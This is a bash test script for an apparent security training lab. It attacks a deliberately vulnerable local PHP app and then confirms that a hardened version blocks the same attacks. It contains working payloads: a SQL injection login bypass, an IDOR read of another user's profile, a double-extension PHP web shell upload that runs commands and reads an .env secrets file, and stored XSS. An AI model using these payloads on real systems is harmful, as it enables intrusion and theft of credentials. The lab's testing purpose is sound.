#!/usr/bin/env bash
set -u

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
VULN="${VULN_URL:-http://localhost:8080}"
SECURE="${SECURE_URL:-http://localhost:8081}"
TMP_DIR="$(mktemp -d)"
PASS=0
FAIL=0

cleanup() {
    rm -rf "$TMP_DIR"
}
trap cleanup EXIT

pass() {
    PASS=$((PASS + 1))
    printf '  PASS  %s\n' "$1"
}

fail() {
    FAIL=$((FAIL + 1))
    printf '  FAIL  %s\n' "$1"
}

section() {
    printf '\n%s\n' "$1"
}

wait_for() {
    local url=$1
    local name=$2
    local attempt

    for attempt in $(seq 1 60); do
        if curl -fsS -o /dev/null "$url/index.php"; then
            return 0
        fi
        sleep 1
    done

    printf 'Timed out waiting for %s at %s\n' "$name" "$url" >&2
    exit 1
}

csrf_from() {
    local jar=$1
    local url=$2

    curl -sS -c "$jar" -b "$jar" "$url" \
        | grep -m1 -o 'name="csrf_token" value="[^"]*"' \
        | sed 's/.*value="//; s/"$//'
}

http_code() {
    curl -sS -o /dev/null -w '%{http_code}' "$@"
}

wait_for "$VULN" "vulnerable app"
wait_for "$SECURE" "secure app"

section "Vulnerable app: SQL injection"
code=$(http_code -c "$TMP_DIR/vuln-sqli.jar" \
    --data-urlencode "username=admin' -- -" \
    --data-urlencode "password=wrong" \
    "$VULN/index.php")

if [[ "$code" == "302" ]]; then
    pass "login bypass with admin' -- -"
else
    fail "login bypass with admin' -- - (got HTTP $code)"
fi

body=$(curl -sS -b "$TMP_DIR/vuln-sqli.jar" "$VULN/admin.php")

if [[ "$body" == *"Admin console"* && "$body" == *"Registered users"* ]]; then
    pass "injected session reaches the admin console"
else
    fail "injected session does not reach the admin console"
fi

section "Vulnerable app: IDOR"

code=$(http_code -c "$TMP_DIR/vuln-alice.jar" \
    --data-urlencode "username=alice" \
    --data-urlencode "password=Password123!" \
    "$VULN/index.php")

if [[ "$code" == "302" ]]; then
    pass "alice can sign in with seeded credentials"
else
    fail "alice cannot sign in (got HTTP $code)"
fi

body=$(curl -sS -b "$TMP_DIR/vuln-alice.jar" "$VULN/profile.php?id=3")

if [[ "$body" == *"Backup email: bob.private@example.com"* ]]; then
    pass "alice can read bob's private note via profile.php?id=3"
else
    fail "IDOR did not expose bob's private note"
fi

section "Vulnerable app: file upload to RCE"

code=$(http_code -b "$TMP_DIR/vuln-alice.jar" \
    -F "avatar=@$ROOT_DIR/payloads/shell.php;filename=shell-lab.php.jpg;type=image/jpeg" \
    "$VULN/upload.php")

if [[ "$code" == "302" ]]; then
    pass "shell-lab.php.jpg passes the image-extension filter"
else
    fail "double-extension upload was rejected (got HTTP $code)"
fi

body=$(curl -sS "$VULN/uploads/shell-lab.php.jpg?cmd=id")

if [[ "$body" == *"RCE_OK"* ]]; then
    pass "uploaded file executes PHP"
else
    fail "uploaded file did not execute"
fi

body=$(curl -sS "$VULN/uploads/shell-lab.php.jpg?cmd=cat%20/srv/pulse/.env")

if [[ "$body" == *"PAYMENT_API_KEY="* ]]; then
    pass "command execution reads the application secrets"
else
    fail "command execution could not read the application secrets"
fi

section "Vulnerable app: stored XSS"

xss='<script>alert("stored-xss")</script>'

code=$(http_code -b "$TMP_DIR/vuln-alice.jar" \
    --data-urlencode "message=$xss" \
    "$VULN/feedback.php")

if [[ "$code" == "302" ]]; then
    pass "feedback payload is accepted"
else
    fail "feedback payload was rejected (got HTTP $code)"
fi

body=$(curl -sS -b "$TMP_DIR/vuln-alice.jar" "$VULN/feedback.php")

if [[ "$body" == *"$xss"* ]]; then
    pass "feedback payload is rendered without encoding"
else
    fail "feedback payload was encoded"
fi

headers=$(curl -sS -D - -o /dev/null \
    --data-urlencode "username=alice" \
    --data-urlencode "password=Password123!" \
    "$VULN/index.php")

cookie=$(grep -i '^set-cookie: PULSE_SID=' <<< "$headers" | head -n1)

if [[ -n "$cookie" && "$cookie" != *"HttpOnly"* ]]; then
    pass "vulnerable session cookie is readable by JavaScript"
else
    fail "vulnerable session cookie unexpectedly has HttpOnly"
fi

section "Secure app: SQL injection is fixed"

token=$(csrf_from "$TMP_DIR/secure.jar" "$SECURE/index.php")

if [[ -n "$token" ]]; then
    pass "login form exposes a CSRF token"
else
    fail "login form has no CSRF token"
fi

body=$(curl -sS -b "$TMP_DIR/secure.jar" -c "$TMP_DIR/secure.jar" \
    --data-urlencode "username=admin' -- -" \
    --data-urlencode "password=wrong" \
    --data-urlencode "csrf_token=$token" \
    "$SECURE/index.php")

if [[ "$body" == *"Invalid username or password."* ]]; then
    pass "same SQL injection payload is rejected"
else
    fail "same SQL injection payload was not rejected"
fi

section "Secure app: IDOR is fixed"

token=$(csrf_from "$TMP_DIR/secure.jar" "$SECURE/index.php")

code=$(http_code -b "$TMP_DIR/secure.jar" -c "$TMP_DIR/secure.jar" \
    --data-urlencode "username=alice" \
    --data-urlencode "password=Password123!" \
    --data-urlencode "csrf_token=$token" \
    "$SECURE/index.php")

if [[ "$code" == "302" ]]; then
    pass "alice can sign in with seeded credentials"
else
    fail "alice cannot sign in (got HTTP $code)"
fi

body=$(curl -sS -b "$TMP_DIR/secure.jar" "$SECURE/dashboard.php")

if [[ "$body" == *"Hi, Alice"* ]]; then
    pass "authenticated dashboard loads"
else
    fail "authenticated dashboard did not load"
fi

code=$(http_code -b "$TMP_DIR/secure.jar" "$SECURE/profile.php?id=3")

if [[ "$code" == "403" ]]; then
    pass "alice is blocked from bob's profile (403)"
else
    fail "alice accessed bob's profile (got HTTP $code)"
fi

code=$(http_code -b "$TMP_DIR/secure.jar" "$SECURE/profile.php?id=2")

if [[ "$code" == "200" ]]; then
    pass "alice can still open her own profile"
else
    fail "alice cannot open her own profile (got HTTP $code)"
fi

section "Secure app: file upload is fixed"

token=$(csrf_from "$TMP_DIR/secure.jar" "$SECURE/profile.php?id=2")
bad_name="shell-$$.php.jpg"

code=$(http_code -b "$TMP_DIR/secure.jar" -c "$TMP_DIR/secure.jar" \
    -F "avatar=@$ROOT_DIR/payloads/shell.php;filename=$bad_name;type=image/jpeg" \
    -F "csrf_token=$token" \
    "$SECURE/upload.php")

if [[ "$code" == "302" ]]; then
    pass "upload endpoint handles the attempt without a fatal error"
else
    fail "upload endpoint returned HTTP $code"
fi

code=$(http_code "$SECURE/uploads/$bad_name")

if [[ "$code" == "404" ]]; then
    pass "double-extension payload is not stored"
else
    fail "double-extension payload is reachable (got HTTP $code)"
fi

printf '%s' 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAusB9Y9Z9ZkAAAAASUVORK5CYII=' \
    | base64 -d > "$TMP_DIR/pixel.png"

code=$(http_code -b "$TMP_DIR/secure.jar" -c "$TMP_DIR/secure.jar" \
    -F "avatar=@$TMP_DIR/pixel.png;filename=pixel.png;type=image/png" \
    -F "csrf_token=$token" \
    "$SECURE/upload.php")

if [[ "$code" == "302" ]]; then
    pass "a real PNG is accepted"
else
    fail "a real PNG was rejected (got HTTP $code)"
fi

body=$(curl -sS -b "$TMP_DIR/secure.jar" "$SECURE/profile.php?id=2")

if [[ "$body" == *"/uploads/"*".png"* ]]; then
    pass "the stored avatar is rendered from a random filename"
else
    fail "the stored avatar is missing from the profile"
fi

section "Secure app: stored XSS is fixed"

token=$(csrf_from "$TMP_DIR/secure.jar" "$SECURE/feedback.php")
xss='<script>alert("secure-xss")</script>'

code=$(http_code -b "$TMP_DIR/secure.jar" -c "$TMP_DIR/secure.jar" \
    --data-urlencode "message=$xss" \
    --data-urlencode "csrf_token=$token" \
    "$SECURE/feedback.php")

if [[ "$code" == "302" ]]; then
    pass "feedback payload is stored as inert text"
else
    fail "feedback submission failed (got HTTP $code)"
fi

body=$(curl -sS -b "$TMP_DIR/secure.jar" "$SECURE/feedback.php")

if [[ "$body" == *"&lt;script&gt;alert(&quot;secure-xss&quot;)&lt;/script&gt;"* ]]; then
    pass "feedback payload is HTML-encoded on output"
else
    fail "feedback payload was not encoded"
fi

if [[ "$body" == *"<script>alert(\"secure-xss\")</script>"* ]]; then
    fail "raw script tag is present in the page"
else
    pass "raw script tag is absent from the page"
fi

section "Secure app: session and browser hardening"

headers=$(curl -sS -D - -o /dev/null "$SECURE/index.php")

if [[ "$headers" == *"Content-Security-Policy:"* ]]; then
    pass "Content-Security-Policy header is present"
else
    fail "Content-Security-Policy header is missing"
fi

token=$(csrf_from "$TMP_DIR/secure-cookie.jar" "$SECURE/index.php")

headers=$(curl -sS -D - -o /dev/null \
    -b "$TMP_DIR/secure-cookie.jar" -c "$TMP_DIR/secure-cookie.jar" \
    --data-urlencode "username=alice" \
    --data-urlencode "password=Password123!" \
    --data-urlencode "csrf_token=$token" \
    "$SECURE/index.php")

cookie=$(grep -i '^set-cookie: PULSE_SID2=' <<< "$headers" | head -n1)

if [[ "$cookie" == *"HttpOnly"* ]]; then
    pass "secure session cookie is HttpOnly"
else
    fail "secure session cookie is not HttpOnly"
fi

section "Results"

printf '%d passed, %d failed\n' "$PASS" "$FAIL"

if [[ "$FAIL" -ne 0 ]]; then
    exit 1
fi
